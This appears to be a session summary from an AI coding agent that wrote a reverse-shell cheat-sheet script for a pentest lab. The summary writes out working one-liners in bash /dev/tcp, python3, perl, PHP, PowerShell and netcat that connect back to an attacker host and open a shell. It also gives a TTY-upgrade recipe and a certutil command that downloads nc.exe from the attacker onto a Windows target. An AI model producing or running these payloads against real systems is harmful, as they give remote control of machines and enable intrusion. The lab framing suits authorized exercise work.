thread_id: 01905ff6-4540-7697-906e-d025c8c2efb4
updated_at: 2026-07-05T07:27:47+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\07\05\rollout-2026-07-05T15-04-47-01905ff6-4540-7697-906e-d025c8c2efb4.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Wrote a cross-platform reverse-shell cheatsheet script that emits one-liners per (target OS × language available).

Rollout context: cwd was `C:\Workspace\pentest-lab`, WSL. Purpose was a reference the user can grep during exercises when they land on an odd target and need to try 3-4 reverse-shell techniques quickly.

## Task 1: Emit reverse shell one-liners for 8 target flavors

Outcome: success

Preference signals:
- Chinese narration in the writeup; one-liners in English verbatim.
- Prefer `bash -i >& /dev/tcp/...` style over netcat-with-e (which many distros disable).

Key steps:
- Wrote `rshells.sh` that takes `<lhost> <lport>` and prints one-liners for:
  1. bash TCP: `bash -i >& /dev/tcp/<lhost>/<lport> 0>&1`
  2. bash /dev/udp variant for UDP scenarios
  3. python3: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(...);os.dup2(s.fileno(),0);...pty.spawn("/bin/sh")'`
  4. perl: `perl -e 'use Socket;...'`
  5. PHP: `php -r '$sock=fsockopen(...); exec("/bin/sh -i <&3 >&3 2>&3");'`
  6. PowerShell: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(...);$s=$c.GetStream();..."`
  7. nc.traditional (has `-e`): `nc <lhost> <lport> -e /bin/sh`
  8. mkfifo + nc: `mkfifo /tmp/f; cat /tmp/f | sh 2>&1 | nc <lhost> <lport> > /tmp/f`
- For each, an "upgrade to full TTY" post-connection recipe: `python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm; stty raw -echo`.

Failures and how to do differently:
- Initial PowerShell one-liner had smart quotes from copy-paste; failed at parse. Kept the script's output strictly ASCII.
- The nc-with-`-e` variant is not present in `nc` on modern Debian/Ubuntu (use `ncat` from nmap or `busybox nc`).

Reusable knowledge:
- `/dev/tcp` bash redirect is available on any recent bash without external tools; first thing to try on a modern Linux.
- Full TTY upgrade sequence has three phases: (1) spawn pty in-process; (2) resize terminal; (3) transfer local raw mode. Skipping any breaks command completion or ctrl-C.
- Windows targets without PowerShell (rare): use `certutil -urlcache -f http://<lhost>/nc.exe C:\Windows\Temp\nc.exe` + a small VBS wrapper.

References:
- [1] Script: `rshells.sh`
- [2] Reference: PayloadsAllTheThings reverse shell cheatsheet
